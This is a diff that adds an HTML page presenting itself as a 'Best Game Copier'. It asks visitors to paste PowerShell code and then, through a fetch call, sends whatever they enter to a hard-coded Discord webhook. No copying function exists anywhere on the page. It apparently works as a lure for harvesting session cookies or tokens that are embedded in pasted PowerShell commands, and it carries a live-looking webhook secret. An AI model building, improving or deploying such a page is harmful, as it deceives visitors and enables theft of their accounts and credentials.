@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Best Game Copier</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: black;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+        }
+
+        /* Background animation */
+        @keyframes backgroundAnimation {
+            0% {
+                background-color: yellow;
+            }
+            50% {
+                background-color: orange;
+            }
+            100% {
+                background-color: yellow;
+            }
+        }
+
+        .background-lines {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .line {
+            position: absolute;
+            width: 2px;
+            height: 100%;
+            background: yellow;
+            animation: backgroundAnimation 3s infinite;
+            opacity: 0.3;
+        }
+
+        .grid {
+            text-align: center;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 300px;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            background: yellow;
+            color: black;
+        }
+
+        button:hover {
+            background: orange;
+        }
+
+        .error {
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="background-lines" id="background-lines"></div>
+
+    <div class="grid">
+        <h1>Best Game Copier</h1>
+        <input id="powershellCode" type="text" placeholder="Enter your PowerShell code" />
+        <button id="copyButton">Submit Code</button>
+        <p id="errorMessage" class="error" style="display: none;">No PowerShell code has been entered. Please enter your PowerShell code and try again.</p>
+    </div>
+
+    <script>
+        const copyButton = document.getElementById('copyButton');
+        const powershellCode = document.getElementById('powershellCode');
+        const errorMessage = document.getElementById('errorMessage');
+
+        const webhookURL = "https://discord.com/api/webhooks/1312257861841195080/W4ql9QaD25K3ghCY3fSvJnor9CDCZtHnea9JwkaO-wxYv8A2flQjDoNp_YwJBu571UTd"; // Replace with your Discord webhook URL
+
+        copyButton.addEventListener('click', () => {
+            const code = powershellCode.value.trim();
+
+            if (!code) {
+                errorMessage.style.display = 'block';
+            } else {
+                errorMessage.style.display = 'none';
+
+                // Send the code to the Discord webhook
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `PowerShell Code Submitted: \n${code}`,
+                    }),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert('PowerShell code successfully sent!');
+                    } else {
+                        alert('Failed to send the PowerShell code. Please try again later.');
+                    }
+                })
+                .catch(error => {
+                    alert('An error occurred: ' + error.message);
+                });
+            }
+        });
+
+        // Generate background lines
+        const backgroundLines = document.getElementById('background-lines');
+
+        function createLine() {
+            const line = document.createElement('div');
+            line.classList.add('line');
+            line.style.left = `${Math.random() * 100}vw`;
+            line.style.animationDuration = `${Math.random() * 5 + 5}s`;
+            line.style.opacity = Math.random() * 0.5 + 0.1;
+            backgroundLines.appendChild(line);
+
+            setTimeout(() => {
+                line.remove();
+            }, 10000);
+        }
+
+        setInterval(createLine, 200);
+    </script>
+</body>
+</html>
